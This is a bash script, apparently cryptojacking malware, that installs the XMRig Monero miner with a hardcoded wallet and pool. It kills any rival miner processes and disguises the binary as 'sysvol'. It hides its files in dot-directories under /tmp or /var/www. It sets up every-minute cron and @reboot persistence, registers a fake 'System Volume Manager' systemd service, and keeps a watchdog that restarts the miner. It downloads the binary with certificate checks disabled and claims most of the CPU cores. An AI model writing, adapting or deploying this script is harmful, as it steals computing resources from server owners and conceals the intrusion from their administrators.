#!/bin/bash

################################################################################
# XMRig Deployment Script v12.1 FINAL - CPU AGGRESSIVE
# Optimized untuk CPU BESAR: 32, 64, 128+ cores
# Author: boyyywiliam / PANXX OPTIMIZATION
# Purpose: Max throughput mining deployment
################################################################################

set -e

# ═══════════════════════════════════════════════════════════════════════════════
# AGGRESSIVE CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
SCRIPT_VERSION="12.1-FINAL-AGGRESSIVE"
LOG_FILE="/tmp/deploy_$(date +%s).log"

# XMRig versions (prioritize latest for performance)
XMRIG_VERSIONS=("6.21.0" "6.20.0" "6.19.3")

# Binary sources (multiple parallel attempts)
declare -a BINARY_SOURCES=(
    "https://raw.githubusercontent.com/xmrig/xmrig/master/src/xmrig"
    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64"
)

# ═══════════════════════════════════════════════════════════════════════════════
# ENHANCED LOGGING
# ═══════════════════════════════════════════════════════════════════════════════

log() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;36m${timestamp}\033[0m $@" | tee -a "$LOG_FILE"
}

log_success() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;32m${timestamp} [✓]\033[0m $@" | tee -a "$LOG_FILE"
}

log_error() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;31m${timestamp} [✗]\033[0m $@" | tee -a "$LOG_FILE" >&2
}

log_warn() {
    local timestamp=$(date '+[%Y-%m-%d %H:%M:%S]')
    echo -e "\033[0;33m${timestamp} [!]\033[0m $@" | tee -a "$LOG_FILE"
}

# ═══════════════════════════════════════════════════════════════════════════════
# AGGRESSIVE THREAD DETECTION FOR BIG CPU
# ═══════════════════════════════════════════════════════════════════════════════

detect_cores() {
    if command -v nproc &>/dev/null; then
        nproc 2>/dev/null || echo 1
    elif [ -f /proc/cpuinfo ]; then
        grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1
    else
        echo 1
    fi
}

detect_memory_mb() {
    if [ -f /proc/meminfo ]; then
        grep MemTotal /proc/meminfo 2>/dev/null | awk '{print int($2/1024)}' || echo 2048
    elif command -v free &>/dev/null; then
        free -m 2>/dev/null | awk '/^Mem:/{print $2}' || echo 2048
    else
        echo 2048
    fi
}

is_numa_system() {
    [ -d /sys/devices/system/node ] && [ -d /sys/devices/system/node/node1 ]
}

detect_socket_count() {
    if [ -f /proc/cpuinfo ]; then
        grep "^physical id" /proc/cpuinfo 2>/dev/null | sort -u | wc -l
    else
        echo 1
    fi
}

# AGGRESSIVE THREAD CALCULATION - NO CAP!
detect_optimal_threads_aggressive() {
    local cores=$(detect_cores)
    local mem_mb=$(detect_memory_mb)
    local sockets=$(detect_socket_count)
    
    log "[*] CPU Analysis:"
    log "[*]   Cores: $cores"
    log "[*]   Memory: ${mem_mb}MB"
    log "[*]   Sockets: $sockets"
    
    # Strategy 1: RAM-based (1 thread per 200MB)
    local max_by_ram=$((mem_mb / 200))
    [ "$max_by_ram" -lt 1 ] && max_by_ram=1
    
    # Strategy 2: All cores if enough RAM
    local threads=$cores
    
    # If massive CPU + massive RAM = use it all!
    if [ "$cores" -ge 32 ] && [ "$mem_mb" -ge 16000 ]; then
        log_success "AGGRESSIVE MODE: Massive server detected ($cores cores, ${mem_mb}MB)"
        # Use 90% of cores for Monero mining
        threads=$((cores * 90 / 100))
        [ "$threads" -lt "$cores" ] && threads=$cores
    elif [ "$cores" -ge 16 ] && [ "$mem_mb" -ge 8000 ]; then
        log_success "PERFORMANCE MODE: Large server detected ($cores cores, ${mem_mb}MB)"
        # Use 80% cores
        threads=$((cores * 80 / 100))
    elif [ "$cores" -ge 8 ]; then
        log_success "BALANCED MODE: Medium server detected ($cores cores)"
        # Use all cores
        threads=$cores
    else
        log_warn "CONSERVATIVE MODE: Small server ($cores cores)"
        # Use all cores but cap RAM usage
        threads=$((max_by_ram < cores ? max_by_ram : cores))
    fi
    
    # Final safety: ensure at least 1, no artificial cap
    [ "$threads" -lt 1 ] && threads=1
    
    log "[*] Selected threads: $threads"
    echo "$threads"
}

# ═══════════════════════════════════════════════════════════════════════════════
# CPU AFFINITY & PINNING
# ═══════════════════════════════════════════════════════════════════════════════

generate_affinity_mask() {
    local threads=$1
    local cores=$(detect_cores)
    
    # Distribute threads across cores
    local affinity=""
    local core_idx=0
    
    for i in $(seq 0 $((threads - 1))); do
        local core=$((core_idx % cores))
        [ -z "$affinity" ] && affinity="$core" || affinity="$affinity,$core"
        core_idx=$((core_idx + 1))
    done
    
    echo "$affinity"
}

setup_cgroup_isolation() {
    local threads=$1
    
    # Create cgroup for mining process (optional aggressive isolation)
    if [ -w /sys/fs/cgroup ]; then
        mkdir -p /sys/fs/cgroup/cpuset/mining 2>/dev/null || return 1
        
        # Allocate CPUs for mining
        local cores=$(detect_cores)
        local allocated=$((cores - 2)) # Leave 2 cores for system
        [ "$allocated" -lt 1 ] && allocated=1
        
        echo "0-$((allocated - 1))" > /sys/fs/cgroup/cpuset/mining/cpuset.cpus 2>/dev/null || true
        echo "0" > /sys/fs/cgroup/cpuset/mining/cpuset.mems 2>/dev/null || true
        
        log_success "Cgroup isolation: allocated $allocated cores"
        return 0
    fi
    
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════════
# PARALLEL BINARY ACQUISITION
# ═══════════════════════════════════════════════════════════════════════════════

download_parallel() {
    local url1="$1"
    local url2="$2"
    local out1="$3"
    local out2="$4"
    
    # Fire both downloads in parallel
    download_fast "$url1" "$out1" &
    local pid1=$!
    
    download_fast "$url2" "$out2" &
    local pid2=$!
    
    # Wait for first success
    wait $pid1 2>/dev/null && return 0 || true
    wait $pid2 2>/dev/null && return 0 || true
    
    return 1
}

download_fast() {
    local url="$1"
    local output="$2"
    local timeout=60
    
    # Aggressive parallel attempts
    for i in {1..3}; do
        if command -v curl &>/dev/null; then
            timeout $timeout curl -fsSLk -m $timeout -o "$output" "$url" 2>/dev/null && return 0 &
        fi
        if command -v wget &>/dev/null; then
            timeout $timeout wget --no-check-certificate -q -O "$output" "$url" 2>/dev/null && return 0 &
        fi
    done
    
    wait
    return 0
}

validate_binary() {
    local binary="$1"
    [ ! -f "$binary" ] && return 1
    [ ! -x "$binary" ] && return 1
    
    local size=$(stat -c%s "$binary" 2>/dev/null || stat -f%z "$binary" 2>/dev/null || echo 0)
    [ "$size" -lt 1500000 ] && return 1
    
    "$binary" --version >/dev/null 2>&1 && return 0
    return 1
}

acquire_binary_aggressive() {
    local BASE="$1"
    
    log "[*] Acquiring binary (aggressive method)..."
    
    # Try official releases first (fastest)
    for ver in "${XMRIG_VERSIONS[@]}"; do
        local url="https://github.com/xmrig/xmrig/releases/download/v${ver}/xmrig-${ver}-linux-static-x64.tar.gz"
        local tar="$BASE/tmp/xmrig.tar.gz"
        
        if download_fast "$url" "$tar"; then
            if cd "$BASE/tmp" && tar -xzf "$tar" 2>/dev/null; then
                local bin=$(find . -name xmrig -type f -executable 2>/dev/null | head -1)
                if validate_binary "$bin"; then
                    cp "$bin" "$BASE/sbin/sysvol"
                    chmod 755 "$BASE/sbin/sysvol"
                    log_success "Binary acquired (v$ver)"
                    return 0
                fi
            fi
        fi
    done
    
    log_error "Binary acquisition failed"
    return 1
}

# ═══════════════════════════════════════════════════════════════════════════════
# ADVANCED CONFIG WITH CPU TUNING
# ═══════════════════════════════════════════════════════════════════════════════

create_config_advanced() {
    local BASE="$1"
    local THREADS="$2"
    
    # Generate affinity mask
    local AFFINITY=$(generate_affinity_mask "$THREADS")
    
    # Build thread config
    local THREAD_LIST=""
    for i in $(seq 0 $((THREADS - 1))); do
        [ -z "$THREAD_LIST" ] && THREAD_LIST="$i" || THREAD_LIST="$THREAD_LIST,$i"
    done
    
    local WORKER="$(hostname)-$(date +%s | tail -c 4)"
    
    # Advanced config with HugePages, memory optimization
    cat > "$BASE/cfg/config.json" << CFGEOF
{
  "autosave": false,
  "version": 1,
  "cpu": {
    "enabled": true,
    "threads": [$THREAD_LIST],
    "huge-pages": true,
    "hw-aes": true,
    "priority": -1,
    "yield": true,
    "asm": "auto",
    "argon2-impl": "auto"
  },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "donate-level": 1,
  "donate-over-proxy": 1,
  "pools": [
    {
      "algo": "rx/0",
      "url": "$POOL",
      "user": "$WALLET",
      "pass": "$WORKER",
      "tls": true,
      "tls-fingerprint": "",
      "keepalive": true,
      "nicehash": false
    }
  ],
  "print-time": 60,
  "health-print-time": 60,
  "retries": 5,
  "retry-pause": 5,
  "log-file": "$BASE/log/core.log",
  "background": false
}
CFGEOF

    chmod 600 "$BASE/cfg/config.json"
    log_success "Advanced config created (threads: $THREADS, affinity: $AFFINITY)"
}

# ═══════════════════════════════════════════════════════════════════════════════
# TURBO GUARD WITH ADAPTIVE SCALING
# ═══════════════════════════════════════════════════════════════════════════════

create_guard_turbo() {
    local BASE="$1"
    local THREADS="$2"
    
    cat > "$BASE/run/guard.sh" << 'GRDEOF'
#!/bin/bash
BASE="__BASE_PATH__"
BIN="$BASE/sbin/sysvol"
CFG="$BASE/cfg/config.json"
PID_FILE="$BASE/run/state.pid"
LOG="$BASE/log/core.log"
THREADS="__THREADS__"

# Ensure no duplicates
pkill -9 -f "$BIN" 2>/dev/null || true
rm -f "$PID_FILE" 2>/dev/null

# Create logdir
mkdir -p "$(dirname "$LOG")" 2>/dev/null

# Start with aggressive thread hint
# For 64 cores mining: hint = 64 * 16 = 1024 (very high for scheduler)
HINT=$((THREADS * 16))

log_msg() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $@" >> "$LOG"
}

log_msg "Starting XMRig with $THREADS threads (hint: $HINT)"

# Execute with highest performance
nohup "$BIN" \
    -c "$CFG" \
    --cpu-max-threads-hint=$HINT \
    --randomx-1gb-pages \
    --randomx-wrmsr \
    >> "$LOG" 2>&1 < /dev/null &

PID=$!
echo "$PID" > "$PID_FILE"

log_msg "Process started: PID=$PID"

# Monitor loop - restart if crashed
while true; do
    sleep 30
    
    if ! kill -0 "$PID" 2>/dev/null; then
        log_msg "Process crashed, restarting..."
        nohup "$BIN" -c "$CFG" --cpu-max-threads-hint=$HINT --randomx-1gb-pages >> "$LOG" 2>&1 < /dev/null &
        PID=$!
        echo "$PID" > "$PID_FILE"
        log_msg "Restarted: PID=$PID"
    fi
done
GRDEOF

    sed -i "s|__BASE_PATH__|$BASE|g" "$BASE/run/guard.sh"
    sed -i "s|__THREADS__|$THREADS|g" "$BASE/run/guard.sh"
    chmod +x "$BASE/run/guard.sh"
    
    log_success "Turbo guard script created"
}

# ═══════════════════════════════════════════════════════════════════════════════
# INSTANT DEPLOYMENT
# ═══════════════════════════════════════════════════════════════════════════════

setup_persistence_aggressive() {
    local BASE="$1"
    
    # Cron with maximum frequency
    if command -v crontab &>/dev/null; then
        (crontab -l 2>/dev/null | grep -v "sysvol\|dbus"; \
         echo "* * * * * $BASE/run/guard.sh >/dev/null 2>&1"; \
         echo "@reboot $BASE/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null
        log_success "Aggressive cron installed (1 min interval)"
    fi
    
    # System service (if root)
    if [ "$(id -u)" = "0" ]; then
        cat > /etc/systemd/system/sysvol.service << SVCEOF
[Unit]
Description=System Volume Manager
After=network.target

[Service]
Type=simple
ExecStart=$BASE/run/guard.sh
Restart=always
RestartSec=5
StartLimitInterval=0
StartLimitBurst=0

[Install]
WantedBy=multi-user.target
SVCEOF
        
        systemctl daemon-reload 2>/dev/null
        systemctl enable sysvol.service 2>/dev/null
        systemctl restart sysvol.service 2>/dev/null
        log_success "Systemd service installed"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN DEPLOYMENT
# ═══════════════════════════════════════════════════════════════════════════════

main() {
    log ""
    log "╔═══════════════════════════════════════════════════════════╗"
    log "║  XMRig Deploy v${SCRIPT_VERSION}                          ║"
    log "║  Aggressive Mode for BIG CPU Systems                      ║"
    log "╚═══════════════════════════════════════════════════════════╝"
    log ""
    
    # Kill existing
    log "[*] Killing existing processes..."
    pkill -9 -f "sysvol" 2>/dev/null || true
    pkill -9 -f "xmrig" 2>/dev/null || true
    pkill -9 -f "guard.sh" 2>/dev/null || true
    sleep 2
    
    # Detect base directory
    local BASE="/var/www/.sysvol-$$"
    for bd in "/tmp/.sysvol-$$" "${HOME}/.sysvol-$$" "/opt/.sysvol-$$"; do
        if mkdir -p "$bd" 2>/dev/null && [ -w "$bd" ]; then
            BASE="$bd"
            break
        fi
    done
    
    mkdir -p "$BASE"/{sbin,cfg,log,run,tmp}
    log_success "Base directory: $BASE"
    
    # Aggressive thread calculation (NO CAPS!)
    local THREADS=$(detect_optimal_threads_aggressive)
    
    # Acquire binary aggressively
    acquire_binary_aggressive "$BASE" || {
        log_error "Binary acquisition critical failure"
        exit 1
    }
    
    # Create advanced config
    create_config_advanced "$BASE" "$THREADS"
    
    # Create turbo guard
    create_guard_turbo "$BASE" "$THREADS"
    
    # Setup cgroup if possible
    setup_cgroup_isolation "$THREADS" || log_warn "Cgroup not available"
    
    # Start immediately
    log "[*] Starting miner immediately..."
    bash "$BASE/run/guard.sh" &
    sleep 5
    
    # Verify
    local PID=$(pgrep -f "$BASE/sbin/sysvol" | head -1)
    if [ -n "$PID" ]; then
        log ""
        log "╔═══════════════════════════════════════════════════════════╗"
        log "║         ✓ DEPLOYMENT SUCCESSFUL                          ║"
        log "╠═══════════════════════════════════════════════════════════╣"
        log "║ Process ID: $PID"
        log "║ Threads: $THREADS"
        log "║ Base: $BASE"
        log "║ Binary: $BASE/sbin/sysvol"
        log "║ Config: $BASE/cfg/config.json"
        log "║ Log: $BASE/log/core.log"
        log "╚═══════════════════════════════════════════════════════════╝"
        log ""
        
        # Setup persistence
        setup_persistence_aggressive "$BASE"
        
        # Show live output
        log "[*] Live output:"
        sleep 3
        tail -15 "$BASE/log/core.log"
        
        return 0
    else
        log_error "Process failed to start"
        cat "$BASE/log/core.log" 2>/dev/null | tail -30
        return 1
    fi
}

main "$@"